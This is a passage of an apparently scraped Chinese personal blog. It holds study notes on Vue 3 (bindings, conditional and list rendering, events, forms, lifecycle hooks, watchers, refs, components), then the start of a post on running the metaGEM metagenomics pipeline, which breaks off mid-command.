bar&quot;&gt;Hi!&lt;/p&gt; 在使用时添加一些 class： 12&lt;!-- 在使用组件时 --&gt;&lt;MyComponent class=&quot;baz boo&quot; /&gt; 渲染出的 HTML 为： 1&lt;p class=&quot;foo bar baz boo&quot;&gt;Hi!&lt;/p&gt; Class 的绑定也是同样的： 1&lt;MyComponent :class=&quot;&#123; active: isActive &#125;&quot; /&gt; 当 isActive 为真时，被渲染的 HTML 会是： 1&lt;p class=&quot;foo bar active&quot;&gt;Hi!&lt;/p&gt; 如果你的组件有多个根元素，你将需要指定哪个根元素来接收这个 class。你可以通过组件的 $attrs 属性来实现指定： 123&lt;!-- MyComponent 模板使用 $attrs 时 --&gt;&lt;p :class=&quot;$attrs.class&quot;&gt;Hi!&lt;/p&gt;&lt;span&gt;This is a child component&lt;/span&gt; 1&lt;MyComponent class=&quot;baz&quot; /&gt; 这将被渲染为： 12&lt;p class=&quot;baz&quot;&gt;Hi!&lt;/p&gt;&lt;span&gt;This is a child component&lt;/span&gt; d 绑定内联样式绑定对象:style 支持绑定 JavaScript 对象值，对应的是 **HTML 元素的 style 属性**： 12const activeColor = ref(&#x27;red&#x27;)const fontSize = ref(30) 1&lt;div :style=&quot;&#123; color: activeColor, fontSize: fontSize + &#x27;px&#x27; &#125;&quot;&gt;&lt;/div&gt; 尽管推荐使用 camelCase，但 :style 也支持 kebab-cased 形式的 CSS 属性 key (对应其 CSS 中的实际名称)，例如： 1&lt;div :style=&quot;&#123; &#x27;font-size&#x27;: fontSize + &#x27;px&#x27; &#125;&quot;&gt;&lt;/div&gt; 直接绑定一个样式对象通常是一个好主意，这样可以使模板更加简洁： 1234const styleObject = reactive(&#123; color: &#x27;red&#x27;, fontSize: &#x27;13px&#x27;&#125;) 1&lt;div :style=&quot;styleObject&quot;&gt;&lt;/div&gt; 同样的，如果样式对象需要更复杂的逻辑，也可以使用返回样式对象的计算属性。 2条件渲染v-if 指令用于条件性地渲染一块内容。这块内容只会在指令的表达式返回真值时才被渲染。 1&lt;h1 v-if=&quot;awesome&quot;&gt;Vue is awesome!&lt;/h1&gt; 你也可以使用 v-else 为 v-if 添加一个“else 区块”。 1234&lt;button @click=&quot;awesome = !awesome&quot;&gt;Toggle&lt;/button&gt;&lt;h1 v-if=&quot;awesome&quot;&gt;Vue is awesome!&lt;/h1&gt;&lt;h1 v-else&gt;Oh no 😢&lt;/h1&gt; v-else-if 提供的是相应于 v-if 的“else if 区块”。它可以连续多次重复使用： 123456789101112&lt;div v-if=&quot;type === &#x27;A&#x27;&quot;&gt; A&lt;/div&gt;&lt;div v-else-if=&quot;type === &#x27;B&#x27;&quot;&gt; B&lt;/div&gt;&lt;div v-else-if=&quot;type === &#x27;C&#x27;&quot;&gt; C&lt;/div&gt;&lt;div v-else&gt; Not A/B/C&lt;/div&gt; 另一个可以用来按条件显示一个元素的指令是 v-show。其用法基本一样： 1&lt;h1 v-show=&quot;ok&quot;&gt;Hello!&lt;/h1&gt; 不同之处在于 v-show 会在 DOM 渲染中保留该元素；v-show 仅切换了该元素上名为 display 的 CSS 属性。 v-show 不支持在 &lt;template&gt; 元素上使用，也不能和 v-else 搭配使用。 3列表渲染我们可以使用 v-for 指令基于一个数组来渲染一个列表。v-for 指令的值需要使用 item in items 形式的特殊语法，其中 items 是源数据的数组，而 item 是迭代项的别名： 1const items = ref([&#123; message: &#x27;Foo&#x27; &#125;, &#123; message: &#x27;Bar&#x27; &#125;]) 123&lt;li v-for=&quot;item in items&quot;&gt; &#123;&#123; item.message &#125;&#125;&lt;/li&gt; 在 v-for 块中可以完整地访问父作用域内的属性和变量。v-for 也支持使用可选的第二个参数表示当前项的位置索引。 12const parentMessage = ref(&#x27;Parent&#x27;)const items = ref([&#123; message: &#x27;Foo&#x27; &#125;, &#123; message: &#x27;Bar&#x27; &#125;]) 123&lt;li v-for=&quot;(item, index) in items&quot;&gt; &#123;&#123; parentMessage &#125;&#125; - &#123;&#123; index &#125;&#125; - &#123;&#123; item.message &#125;&#125;&lt;/li&gt; v-for 变量的作用域和下面的 JavaScript 代码很类似： 12345678910const parentMessage = &#x27;Parent&#x27;const items = [ /* ... */]items.forEach((item, index) =&gt; &#123; // 可以访问外层的 `parentMessage` // 而 `item` 和 `index` 只在这个作用域可用 console.log(parentMessage, item.message, index)&#125;) &lt;template&gt; 上的 v-for 与模板上的 v-if 类似，你也可以在 &lt;template&gt; 标签上使用 v-for 来渲染一个包含多个元素的块。例如： 123456&lt;ul&gt; &lt;template v-for=&quot;item in items&quot;&gt; &lt;li&gt;&#123;&#123; item.msg &#125;&#125;&lt;/li&gt; &lt;li class=&quot;divider&quot; role=&quot;presentation&quot;&gt;&lt;/li&gt; &lt;/template&gt;&lt;/ul&gt; 4事件处理a监听事件我们可以使用 v-on 指令 (简写为 @) 来监听 DOM 事件，并在事件触发时执行对应的 JavaScript。用法：v-on:click=&quot;handler&quot; 或 @click=&quot;handler&quot;。 事件处理器 (handler) 的值可以是： 内联事件处理器：事件被触发时执行的内联 JavaScript 语句 (与 onclick 类似)。 方法事件处理器：一个指向组件上定义的方法的属性名或是路径。 b内联事件处理器（直接用）内联事件处理器通常用于简单场景，例如： 1const count = ref(0) 12&lt;button @click=&quot;count++&quot;&gt;Add 1&lt;/button&gt;&lt;p&gt;Count is: &#123;&#123; count &#125;&#125;&lt;/p&gt; c方法事件处理器（通过方法调用）随着事件处理器的逻辑变得愈发复杂，内联代码方式变得不够灵活。因此 v-on 也可以接受一个方法名或对某个方法的调用。 举例来说： 123456789const name = ref(&#x27;Vue.js&#x27;)function greet(event) &#123; alert(`Hello $&#123;name.value&#125;!`) // `event` 是 DOM 原生事件 if (event) &#123; alert(event.target.tagName) &#125;&#125; 12&lt;!-- `greet` 是上面定义过的方法名 --&gt;&lt;button @click=&quot;greet&quot;&gt;Greet&lt;/button&gt; d在内联事件处理器中访问事件参数有时我们需要在内联事件处理器中访问原生 DOM 事件。你可以向该处理器方法传入一个特殊的 $event 变量，或者使用内联箭头函数： 123456789&lt;!-- 使用特殊的 $event 变量 --&gt;&lt;button @click=&quot;warn(&#x27;Form cannot be submitted yet.&#x27;, $event)&quot;&gt; Submit&lt;/button&gt;&lt;!-- 使用内联箭头函数 --&gt;&lt;button @click=&quot;(event) =&gt; warn(&#x27;Form cannot be submitted yet.&#x27;, event)&quot;&gt; Submit&lt;/button&gt; 1234567function warn(message, event) &#123; // 这里可以访问原生事件 if (event) &#123; event.preventDefault() &#125; alert(message)&#125; e事件修饰符在处理事件时调用 event.preventDefault() 或 event.stopPropagation() 是很常见的。尽管我们可以直接在方法内调用，但如果方法能更专注于数据逻辑而不用去处理 DOM 事件的细节会更好。 为解决这一问题，Vue 为 v-on 提供了事件修饰符。修饰符是用 . 表示的指令后缀，包含以下这些： .stop .prevent .self .capture .once .passive 123456789101112131415&lt;!-- 单击事件将停止传递 --&gt;&lt;a @click.stop=&quot;doThis&quot;&gt;&lt;/a&gt;&lt;!-- 提交事件将不再重新加载页面 --&gt;&lt;form @submit.prevent=&quot;onSubmit&quot;&gt;&lt;/form&gt;&lt;!-- 修饰语可以使用链式书写 --&gt;&lt;a @click.stop.prevent=&quot;doThat&quot;&gt;&lt;/a&gt;&lt;!-- 也可以只有修饰符 --&gt;&lt;form @submit.prevent&gt;&lt;/form&gt;&lt;!-- 仅当 event.target 是元素本身时才会触发事件处理器 --&gt;&lt;!-- 例如：事件处理器不来自子元素 --&gt;&lt;div @click.self=&quot;doThat&quot;&gt;...&lt;/div&gt; 5 表单输入绑定在前端处理表单时，我们常常需要将表单输入框的内容同步给 JavaScript 中相应的变量。手动连接值绑定和更改事件监听器可能会很麻烦： 123&lt;input :value=&quot;text&quot; @input=&quot;event =&gt; text = event.target.value&quot;&gt; v-model 指令帮我们简化了这一步骤： 1&lt;input v-model=&quot;text&quot;&gt; 另外，v-model 还可以用于各种不同类型的输入，&lt;textarea&gt;、&lt;select&gt; 元素。它会根据所使用的元素自动使用对应的 DOM 属性和事件组合： 文本类型的 &lt;input&gt; 和 &lt;textarea&gt; 元素会绑定 value property 并侦听 input 事件； &lt;input type=&quot;checkbox&quot;&gt; 和 &lt;input type=&quot;radio&quot;&gt; 会绑定 checked property 并侦听 change 事件； &lt;select&gt; 会绑定 value property 并侦听 change 事件。 文本 12&lt;p&gt;Message is: &#123;&#123; message &#125;&#125;&lt;/p&gt;&lt;input v-model=&quot;message&quot; placeholder=&quot;edit me&quot; /&gt; 多行文本 123&lt;span&gt;Multiline message is:&lt;/span&gt;&lt;p style=&quot;white-space: pre-line;&quot;&gt;&#123;&#123; message &#125;&#125;&lt;/p&gt;&lt;textarea v-model=&quot;message&quot; placeholder=&quot;add multiple lines&quot;&gt;&lt;/textarea&gt; 复选框 单一的复选框，绑定布尔类型值： 12&lt;input type=&quot;checkbox&quot; id=&quot;checkbox&quot; v-model=&quot;checked&quot; /&gt;&lt;label for=&quot;checkbox&quot;&gt;&#123;&#123; checked &#125;&#125;&lt;/label&gt; 我们也可以将多个复选框绑定到同一个数组或集合的值： 1const checkedNames = ref([]) 12345678910&lt;div&gt;Checked names: &#123;&#123; checkedNames &#125;&#125;&lt;/div&gt;&lt;input type=&quot;checkbox&quot; id=&quot;jack&quot; value=&quot;Jack&quot; v-model=&quot;checkedNames&quot;&gt;&lt;label for=&quot;jack&quot;&gt;Jack&lt;/label&gt;&lt;input type=&quot;checkbox&quot; id=&quot;john&quot; value=&quot;John&quot; v-model=&quot;checkedNames&quot;&gt;&lt;label for=&quot;john&quot;&gt;John&lt;/label&gt;&lt;input type=&quot;checkbox&quot; id=&quot;mike&quot; value=&quot;Mike&quot; v-model=&quot;checkedNames&quot;&gt;&lt;label for=&quot;mike&quot;&gt;Mike&lt;/label&gt; 选择器单个选择器的示例如下： 1234567&lt;div&gt;Selected: &#123;&#123; selected &#125;&#125;&lt;/div&gt;&lt;select v-model=&quot;selected&quot;&gt; &lt;option disabled value=&quot;&quot;&gt;Please select one&lt;/option&gt; &lt;option&gt;A&lt;/option&gt; &lt;option&gt;B&lt;/option&gt; &lt;option&gt;C&lt;/option&gt;&lt;/select&gt; 多选 (值绑定到一个数组)： 1234567&lt;div&gt;Selected: &#123;&#123; selected &#125;&#125;&lt;/div&gt;&lt;select v-model=&quot;selected&quot; multiple&gt; &lt;option&gt;A&lt;/option&gt; &lt;option&gt;B&lt;/option&gt; &lt;option&gt;C&lt;/option&gt;&lt;/select&gt; 选择器的选项可以使用 v-for 动态渲染： 1234567const selected = ref(&#x27;A&#x27;)const options = ref([ &#123; text: &#x27;One&#x27;, value: &#x27;A&#x27; &#125;, &#123; text: &#x27;Two&#x27;, value: &#x27;B&#x27; &#125;, &#123; text: &#x27;Three&#x27;, value: &#x27;C&#x27; &#125;]) 1234567&lt;select v-model=&quot;selected&quot;&gt; &lt;option v-for=&quot;option in options&quot; :value=&quot;option.value&quot;&gt; &#123;&#123; option.text &#125;&#125; &lt;/option&gt;&lt;/select&gt;&lt;div&gt;Selected: &#123;&#123; selected &#125;&#125;&lt;/div&gt; 6生命周期钩子每个 Vue 组件实例在创建时都需要经历一系列的初始化步骤，比如设置好数据侦听，编译模板，挂载实例到 DOM，以及在数据改变时更新 DOM。在此过程中，它也会运行被称为生命周期钩子的函数，让开发者有机会在特定阶段运行自己的代码。 a注册周期钩子举例来说，onMounted 钩子可以用来在组件完成初始渲染并创建 DOM 节点后运行代码： 1234567&lt;script setup&gt;import &#123; onMounted &#125; from &#x27;vue&#x27;onMounted(() =&gt; &#123; console.log(`the component is now mounted.`)&#125;)&lt;/script&gt; 还有其他一些钩子，会在实例生命周期的不同阶段被调用，最常用的是 [onMounted](https://cn.vuejs.org/api/composition-api-lifecycle.html#onmounted)、[onUpdated](https://cn.vuejs.org/api/composition-api-lifecycle.html#onupdated) 和 **[onUnmounted](https://cn.vuejs.org/api/composition-api-lifecycle.html#onunmounted)**。所有生命周期钩子的完整参考及其用法请参考 **API 索引**。 当调用 onMounted 时，Vue 会自动将回调函数注册到当前正被初始化的组件实例上。这意味着这些钩子应当在组件初始化时被同步注册。例如，请不要这样做： 123456setTimeout(() =&gt; &#123; onMounted(() =&gt; &#123; // 异步注册时当前组件实例已丢失 // 这将不会正常工作 &#125;)&#125;, 100) 注意这并不意味着对 onMounted 的调用必须放在 setup() 或 &lt;script setup&gt; 内的词法上下文中。onMounted() 也可以在一个外部函数中调用，只要调用栈是同步的，且最终起源自 setup() 就可以。 b.生命周期图示下面是实例生命周期的图表。你现在并不需要完全理解图中的所有内容，但以后它将是一个有用的参考。 7 侦听器基本示例 计算属性允许我们声明性地计算衍生值。然而在有些情况下，我们需要在状态变化时执行一些“副作用”：例如更改 DOM，或是根据异步操作的结果去修改另一处的状态。 在组合式 API 中，我们可以使用 [watch](https://cn.vuejs.org/api/reactivity-core.html#watch) 函数在每次响应式状态发生变化时触发回调函数： 1234567891011121314151617181920212223242526272829&lt;script setup&gt;import &#123; ref, watch &#125; from &#x27;vue&#x27;const question = ref(&#x27;&#x27;)const answer = ref(&#x27;Questions usually contain a question mark. ;-)&#x27;)const loading = ref(false)// 可以直接侦听一个 refwatch(question, async (newQuestion, oldQuestion) =&gt; &#123; if (newQuestion.includes(&#x27;?&#x27;)) &#123; loading.value = true answer.value = &#x27;Thinking...&#x27; try &#123; const res = await fetch(&#x27;https://yesno.wtf/api&#x27;) answer.value = (await res.json()).answer &#125; catch (error) &#123; answer.value = &#x27;Error! Could not reach the API. &#x27; + error &#125; finally &#123; loading.value = false &#125; &#125;&#125;)&lt;/script&gt;&lt;template&gt; &lt;p&gt; Ask a yes/no question: &lt;input v-model=&quot;question&quot; :disabled=&quot;loading&quot; /&gt; &lt;/p&gt; &lt;p&gt;&#123;&#123; answer &#125;&#125;&lt;/p&gt;&lt;/template&gt; 侦听数据源类型watch 的第一个参数可以是不同形式的“数据源”：它可以是一个 ref (包括计算属性)、一个响应式对象、一个 getter 函数、或多个数据源组成的数组： 1234567891011121314151617181920const x = ref(0)const y = ref(0)// 单个 refwatch(x, (newX) =&gt; &#123; console.log(`x is $&#123;newX&#125;`)&#125;)// getter 函数watch( () =&gt; x.value + y.value, (sum) =&gt; &#123; console.log(`sum of x + y is: $&#123;sum&#125;`) &#125;)// 多个来源组成的数组watch([x, () =&gt; y.value], ([newX, newY]) =&gt; &#123; console.log(`x is $&#123;newX&#125; and y is $&#123;newY&#125;`)&#125;) 注意，你不能直接侦听响应式对象的属性值，例如: 123456const obj = reactive(&#123; count: 0 &#125;)// 错误，因为 watch() 得到的参数是一个 numberwatch(obj.count, (count) =&gt; &#123; console.log(`count is: $&#123;count&#125;`)&#125;) 这里需要用一个返回该属性的 getter 函数： 1234567// 提供一个 getter 函数watch( () =&gt; obj.count, (count) =&gt; &#123; console.log(`count is: $&#123;count&#125;`) &#125;) 8 模板引用虽然 Vue 的声明性渲染模型为你抽象了大部分对 DOM 的直接操作，但在某些情况下，我们仍然需要直接访问底层 DOM 元素。要实现这一点，我们可以使用特殊的 ref attribute： 1&lt;input ref=&quot;input&quot;&gt; ref 是一个特殊的 attribute，和 v-for 章节中提到的 key 类似。它允许我们在一个特定的 DOM 元素或子组件实例被挂载后，获得对它的直接引用。这可能很有用，比如说在组件挂载时将焦点设置到一个 input 元素上，或在一个元素上初始化一个第三方库。 a.访问模板引用为了通过组合式 API 获得该模板引用，我们需要声明一个匹配模板 ref attribute 值的 ref： 123456789101112131415&lt;script setup&gt;import &#123; ref, onMounted &#125; from &#x27;vue&#x27;// 声明一个 ref 来存放该元素的引用// 必须和模板里的 ref 同名const input = ref(null)onMounted(() =&gt; &#123; input.value.focus()&#125;)&lt;/script&gt;&lt;template&gt; &lt;input ref=&quot;input&quot; /&gt;&lt;/template&gt; 如果不使用 &lt;script setup&gt;，需确保从 setup() 返回 ref： 123456789export default &#123; setup() &#123; const input = ref(null) // ... return &#123; input &#125; &#125;&#125; 注意，你只可以在组件挂载后才能访问模板引用。如果你想在模板中的表达式上访问 input，在初次渲染时会是 null。这是因为在初次渲染前这个元素还不存在呢！ 如果你需要侦听一个模板引用 ref 的变化，确保考虑到其值为 null 的情况： 1234567watchEffect(() =&gt; &#123; if (input.value) &#123; input.value.focus() &#125; else &#123; // 此时还未挂载，或此元素已经被卸载（例如通过 v-if 控制） &#125;&#125;) b函数模板引用除了使用字符串值作名字，ref attribute 还可以绑定为一个函数，会在每次组件更新时都被调用。该函数会收到元素引用作为其第一个参数： 1&lt;input :ref=&quot;(el) =&gt; &#123; /* 将 el 赋值给一个数据属性或 ref 变量 */ &#125;&quot;&gt; 注意我们这里需要使用动态的 :ref 绑定才能够传入一个函数。当绑定的元素被卸载时，函数也会被调用一次，此时的 el 参数会是 null。你当然也可以绑定一个组件方法而不是内联函数。 c组件上的 ref模板引用也可以被用在一个子组件上。这种情况下引用中获得的值是组件实例： 1234567891011121314&lt;script setup&gt;import &#123; ref, onMounted &#125; from &#x27;vue&#x27;import Child from &#x27;./Child.vue&#x27;const child = ref(null)onMounted(() =&gt; &#123; // child.value 是 &lt;Child /&gt; 组件的实例&#125;)&lt;/script&gt;&lt;template&gt; &lt;Child ref=&quot;child&quot; /&gt;&lt;/template&gt; 如果一个子组件使用的是选项式 API 或没有使用 &lt;script setup&gt;，被引用的组件实例和该子组件的 this 完全一致，这意味着父组件对子组件的每一个属性和方法都有完全的访问权。这使得在父组件和子组件之间创建紧密耦合的实现细节变得很容易，当然也因此，应该只在绝对需要时才使用组件引用。大多数情况下，你应该首先使用标准的 props 和 emit 接口来实现父子组件交互。 有一个例外的情况，使用了 &lt;script setup&gt; 的组件是默认私有的：一个父组件无法访问到一个使用了 &lt;script setup&gt; 的子组件中的任何东西，除非子组件在其中通过 defineExpose 宏显式暴露： 123456789101112&lt;script setup&gt;import &#123; ref &#125; from &#x27;vue&#x27;const a = 1const b = ref(2)// 像 defineExpose 这样的编译器宏不需要导入defineExpose(&#123; a, b&#125;)&lt;/script&gt; 当父组件通过模板引用获取到了该组件的实例时，得到的实例类型为 &#123; a: number, b: number &#125; (ref 都会自动解包，和一般的实例一样)。 9.组件基础组件允许我们将 UI 划分为独立的、可重用的部分，并且可以对每个部分进行单独的思考。在实际应用中，组件常常被组织成层层嵌套的树状结构： 这和我们嵌套 HTML 元素的方式类似，Vue 实现了自己的组件模型，使我们可以在每个组件内封装自定义内容与逻辑。Vue 同样也能很好地配合原生 Web Component。如果你想知道 Vue 组件与原生 Web Components 之间的关系 a定义一个组件当使用构建步骤时，我们一般会将 Vue 组件定义在一个单独的 .vue 文件中，这被叫做单文件组件 (简称 SFC)： 123456789&lt;script setup&gt;import &#123; ref &#125; from &#x27;vue&#x27;const count = ref(0)&lt;/script&gt;&lt;template&gt; &lt;button @click=&quot;count++&quot;&gt;You clicked me &#123;&#123; count &#125;&#125; times.&lt;/button&gt;&lt;/template&gt; 当不使用构建步骤时，一个 Vue 组件以一个包含 Vue 特定选项的 JavaScript 对象来定义:(好像不太常用这个形式) 1234567891011121314import &#123; ref &#125; from &#x27;vue&#x27;export default &#123; setup() &#123; const count = ref(0) return &#123; count &#125; &#125;, template: ` &lt;button @click=&quot;count++&quot;&gt; You clicked me &#123;&#123; count &#125;&#125; times. &lt;/button&gt;` // 也可以针对一个 DOM 内联模板： // template: &#x27;#my-template-element&#x27;&#125; 这里的模板是一个内联的 JavaScript 字符串，Vue 将会在运行时编译它。你也可以使用 ID 选择器来指向一个元素 (通常是原生的 &lt;template&gt; 元素)，Vue 将会使用其内容作为模板来源。 上面的例子中定义了一个组件，并在一个 .js 文件里默认导出了它自己，但你也可以通过具名导出在一个文件中导出多个组件。 b使用组件要使用一个子组件，我们需要在父组件中导入它。假设我们把计数器组件放在了一个叫做 ButtonCounter.vue 的文件中，这个组件将会以默认导出的形式被暴露给外部。 12345678&lt;script setup&gt;import ButtonCounter from &#x27;./ButtonCounter.vue&#x27;&lt;/script&gt;&lt;template&gt; &lt;h1&gt;Here is a child component!&lt;/h1&gt; &lt;ButtonCounter /&gt;&lt;/template&gt; 通过 &lt;script setup&gt;，导入的组件都在模板中直接可用。 当然，你也可以全局地注册一个组件，使得它在当前应用中的任何组件上都可以使用，而不需要额外再导入。。 组件可以被重用任意多次： 1234&lt;h1&gt;Here is a child component!&lt;/h1&gt;&lt;ButtonCounter /&gt;&lt;ButtonCounter /&gt;&lt;ButtonCounter /&gt; 你会注意到，每当点击这些按钮时，每一个组件都维护着自己的状态，是不同的 count。这是因为每当你使用一个组件，就创建了一个新的实例。 在单文件组件中，推荐为子组件使用 PascalCase 的标签名，以此来和原生的 HTML 元素作区分。虽然原生 HTML 标签名是不区分大小写的，但 Vue 单文件组件是可以在编译中区分大小写的。我们也可以使用 /&gt; 来关闭一个标签。 如果你是直接在 DOM 中书写模板 (例如原生 &lt;template&gt; 元素的内容)，模板的编译需要遵从浏览器中 HTML 的解析行为。在这种情况下，你应该需要使用 kebab-case 形式并显式地关闭这些组件的标签。 c传递 props如果我们正在构建一个博客，我们可能需要一个表示博客文章的组件。我们希望所有的博客文章分享相同的视觉布局，但有不同的内容。要实现这样的效果自然必须向组件中传递数据，例如每篇文章标题和内容，这就会使用到 props。 Props 是一种特别的 attributes，你可以在组件上声明注册。要传递给博客文章组件一个标题，我们必须在组件的 props 列表上声明它。这里要用到 defineProps 宏： 12345678&lt;!-- BlogPost.vue --&gt;&lt;script setup&gt;defineProps([&#x27;title&#x27;])&lt;/script&gt;&lt;template&gt; &lt;h4&gt;&#123;&#123; title &#125;&#125;&lt;/h4&gt;&lt;/template&gt; defineProps 是一个仅 &lt;script setup&gt; 中可用的编译宏命令，并不需要显式地导入。声明的 props 会自动暴露给模板。defineProps 会返回一个对象，其中包含了可以传递给组件的所有 props： 12const props = defineProps([&#x27;title&#x27;])console.log(props.title) 一个组件可以有任意多的 props，默认情况下，所有 prop 都接受任意类型的值。 当一个 prop 被注册后，可以像这样以自定义 attribute 的形式传递数据给它： 123&lt;BlogPost title=&quot;My journey with Vue&quot; /&gt;&lt;BlogPost title=&quot;Blogging with Vue&quot; /&gt;&lt;BlogPost title=&quot;Why Vue is so fun&quot; /&gt; 在实际应用中，我们可能在父组件中会有如下的一个博客文章数组： 12345const posts = ref([ &#123; id: 1, title: &#x27;My journey with Vue&#x27; &#125;, &#123; id: 2, title: &#x27;Blogging with Vue&#x27; &#125;, &#123; id: 3, title: &#x27;Why Vue is so fun&#x27; &#125;]) 这种情况下，我们可以使用 v-for 来渲染它们： 12345&lt;BlogPost v-for=&quot;post in posts&quot; :key=&quot;post.id&quot; :title=&quot;post.title&quot; /&gt; d监听事件让我们继续关注我们的 &lt;BlogPost&gt; 组件。我们会发现有时候它需要与父组件进行交互。例如，要在此处实现无障碍访问的需求，将博客文章的文字能够放大，而页面的其余部分仍使用默认字号。 在父组件中，我们可以添加一个 postFontSize ref 来实现这个效果： 12345const posts = ref([ /* ... */])const postFontSize = ref(1) 在模板中用它来控制所有博客文章的字体大小： 1234567&lt;div :style=&quot;&#123; fontSize: postFontSize + &#x27;em&#x27; &#125;&quot;&gt; &lt;BlogPost v-for=&quot;post in posts&quot; :key=&quot;post.id&quot; :title=&quot;post.title&quot; /&gt;&lt;/div&gt; 然后，给 &lt;BlogPost&gt; 组件添加一个按钮： 1234567&lt;!-- BlogPost.vue, 省略了 &lt;script&gt; --&gt;&lt;template&gt; &lt;div class=&quot;blog-post&quot;&gt; &lt;h4&gt;&#123;&#123; title &#125;&#125;&lt;/h4&gt; &lt;button&gt;Enlarge text&lt;/button&gt; &lt;/div&gt;&lt;/template&gt; 这个按钮目前还没有做任何事情，我们想要点击这个按钮来告诉父组件它应该放大所有博客文章的文字。要解决这个问题，组件实例提供了一个自定义事件系统。父组件可以通过 v-on 或 @ 来选择性地监听子组件上抛的事件，就像监听原生 DOM 事件那样： 1234&lt;BlogPost ... @enlarge-text=&quot;postFontSize += 0.1&quot; /&gt; 子组件可以通过调用内置的 **[$emit 方法](https://cn.vuejs.org/api/component-instance.html#emit)**，通过传入事件名称来抛出一个事件： 1234567&lt;!-- BlogPost.vue, 省略了 &lt;script&gt; --&gt;&lt;template&gt; &lt;div class=&quot;blog-post&quot;&gt; &lt;h4&gt;&#123;&#123; title &#125;&#125;&lt;/h4&gt; &lt;button @click=&quot;$emit(&#x27;enlarge-text&#x27;)&quot;&gt;Enlarge text&lt;/button&gt; &lt;/div&gt;&lt;/template&gt; 我们可以通过 [defineEmits](https://cn.vuejs.org/api/sfc-script-setup.html#defineprops-defineemits) 宏来声明需要抛出的事件： 12345&lt;!-- BlogPost.vue --&gt;&lt;script setup&gt;defineProps([&#x27;title&#x27;])defineEmits([&#x27;enlarge-text&#x27;])&lt;/script&gt; 这声明了一个组件可能触发的所有事件，还可以对事件的参数进行验证。同时，这还可以让 Vue 避免将它们作为原生事件监听器隐式地应用于子组件的根元素。 和 defineProps 类似，defineEmits 仅可用于 &lt;script setup&gt; 之中，并且不需要导入，它返回一个等同于 $emit 方法的 emit 函数。它可以被用于在组件的 &lt;script setup&gt; 中抛出事件，因为此处无法直接访问 $emit： 12345&lt;script setup&gt;const emit = defineEmits([&#x27;enlarge-text&#x27;])emit(&#x27;enlarge-text&#x27;)&lt;/script&gt; e通过插槽来分配内容一些情况下我们会希望能和 HTML 元素一样向组件中传递内容： 123&lt;AlertBox&gt; Something bad happened.&lt;/AlertBox&gt; 我们期望能渲染成这样： 这可以通过 Vue 的自定义 &lt;slot&gt; 元素来实现： 123456789101112&lt;template&gt; &lt;div class=&quot;alert-box&quot;&gt; &lt;strong&gt;This is an Error for Demo Purposes&lt;/strong&gt; &lt;slot /&gt; &lt;/div&gt;&lt;/template&gt;&lt;style scoped&gt;.alert-box &#123; /* ... */&#125;&lt;/style&gt; 今天学到这里，下课！","categories":[{"name":"前端学习","slug":"前端学习","permalink":"https://snowman12137.github.io/categories/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"前端学习,VUE","slug":"前端学习-VUE","permalink":"https://snowman12137.github.io/tags/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0-VUE/"}],"author":"Sn0wma1n"},{"title":"metaGEM使用小记(解决各种问题)2024.1(三)","slug":"metaGEM使用小记-解决各种问题-2024-2（三）","date":"2024-02-04T16:00:00.000Z","updated":"2024-03-02T14:18:07.974Z","comments":true,"path":"2024/02/05/metaGEM使用小记-解决各种问题-2024-2（三）/","link":"","permalink":"https://snowman12137.github.io/2024/02/05/metaGEM%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%AE%B0-%E8%A7%A3%E5%86%B3%E5%90%84%E7%A7%8D%E9%97%AE%E9%A2%98-2024-2%EF%BC%88%E4%B8%89%EF%BC%89/","excerpt":"","text":"metaGEM使用小记(解决各种问题)2024.2(三)正式流程这是原始文件夹省略了这些文件的内容，tree -I &#39;scripts|rules|envs&#39; 每次新生成的文件和文件夹会用*标记出来 12345678910111213.├── config.yaml├── dataset│ ├── L1EFG190305--AM43│ │ ├── L1EFG190305--AM43_R1.fastq.gz│ │ └── L1EFG190305--AM43_R2.fastq.gz│ └── L1EFG190306--AM51│ ├── L1EFG190306--AM51_R1.fastq.gz│ └── L1EFG190306--AM51_R2.fastq.gz├── logs├── metaGEM.sh├── Snakefile├── temp 1.使用fastp质量过滤reads每个样本提交一个质量过滤工作，每个过滤工作有2个CPU和20GB 内存，最大运行时间为2小时 123bash metaGEM.sh -t fastp -j 2 -c 2 -m 20 -h 2 #运行主要程序(不要忘了source)#可视化质量筛选结果：bash metaGEM.sh -t qfilterVis 2.用 Megahit 组装每个样品提交一个组装作业，每个组装作业有24个CPU和120GB 内存，最大运行时间为24小时: 123bash metaGEM.sh -t megahit -j 2 -c 24 -m 120 -h 24#可视化组装结果bash metaGEM.sh -t assemblyVis 3. 使用 CONCOCT、 MaxBin2和 MetaBAT2分箱使用 bwa 和 samtools，将每组成对的末端读数与每组组装的组合进行交叉映射，以获得样品间组合的丰度&#x2F;覆盖率。每个样本提交一个作业，每个作业有24个CPU和120GB 内存，最大运行时间为24小时: 1bash metaGEM.sh -t crossMapSeries -j 2 -c 24 -m 120 -h 24 注意这里如果报错找不到XXX.py是没有安装CONCOCT需要手动安装（好像后面还缺了什么文件先不管它） 1234wget https://github.com/BinPro/CONCOCT/archive/refs/tags/1.1.0.tar.gztar -zxvf 1.1.0.tar.gzcd 1.1.0.tar.gzpython setup.py install 如果安装时 报错gsl&#x2F;gsl_vector.h: No such file or directory 移步这里 或者快捷解决conda install anaconda::gsl 后面还让我装了pandas和pyarrow(奇怪) 1conda install anaconda::pandas anaconda::pyarrow -y 注意: 旧的 rule CrosMap 被分成了 CrosMapSeries 和 rosMapParaller 两部分。运行序列映射更加简单，但是从计算资源的角度来看，对于有大量样本的数据集，例如 N &#x3D; 1000，运行映射的代价可能会高得令人望而却步。在样本之间运行每个binners，使用连续覆盖率: 123bash metaGEM.sh -t concoct -j 2 -c 24 -m 80 -h 10bash metaGEM.sh -t metabat -j 2 -c 24 -m 80 -h 10bash metaGEM.sh -t maxbin -j 2 -c 24 -m 80 -h 10 4.使用metWRAP改进和重新组装优化和重组bins 1bash metaGEM.sh -t binRefine -j 2 -c 24 -m 150 -h 24 报错1(concoct)：TypeError: Feature names are only supported if all input features have string names, but your input has [‘int’, ‘str’] as feature name &#x2F; column name types. If you want feature names to be stored and validated, you must convert them all to strings, by using X.columns &#x3D; X.columns.astype(str) for example. Otherwise you can remove feature &#x2F; column names from your input data, or convert them all to a non-string data type. 根据报错找到关键语句 1concoct --coverage_file $(basename /home/gc/metaGEM/workflow/concoct/L1EFG190305--AM43/cov/coverage_table.tsv) --composition_file assembly_c10k.fa -b $(basename $(dirname 